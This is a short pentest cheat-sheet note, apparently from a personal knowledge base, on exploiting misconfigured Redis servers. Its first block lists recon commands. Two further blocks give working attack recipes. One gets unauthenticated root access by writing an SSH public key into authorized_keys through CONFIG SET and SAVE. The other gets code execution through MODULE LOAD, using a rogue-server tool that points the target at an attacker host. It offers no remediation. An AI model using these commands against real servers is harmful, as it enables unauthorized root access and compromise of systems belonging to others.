---
aliases:
tags:
  - estado/completo
  - service/redis
  - asset/database
kind: Concept
linked:
---
# Redis

> [!info]
> In-memory key-value store. Default port 6379. Common misconfig: no auth bound to 0.0.0.0 → unauth RCE via CONFIG SET dir + SSH key write, MODULE LOAD, replication abuse.

## Recon

```bash
nmap -p 6379 -sV --script redis-info <target>
redis-cli -h <target>
redis-cli -h <target> -a <password>
> INFO
> CONFIG GET *
> KEYS *
> DBSIZE
```

## Unauth RCE → SSH key write

```bash
ssh-keygen -t rsa -f ./rkey -N ''
(echo -e "\n\n"; cat rkey.pub; echo -e "\n\n") > pub.txt
cat pub.txt | redis-cli -h <target> -x SET pubkey
redis-cli -h <target>
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SAVE
ssh -i rkey root@<target>
```

## RCE via MODULE LOAD (Redis 4.0+)

```bash
git clone https://github.com/Dliv3/redis-rogue-server
cd redis-rogue-server
python3 redis-rogue-server.py --rhost <target> --rport 6379 --lhost <attacker>
```

## Notas Relacionadas
- [[Default credentials]]
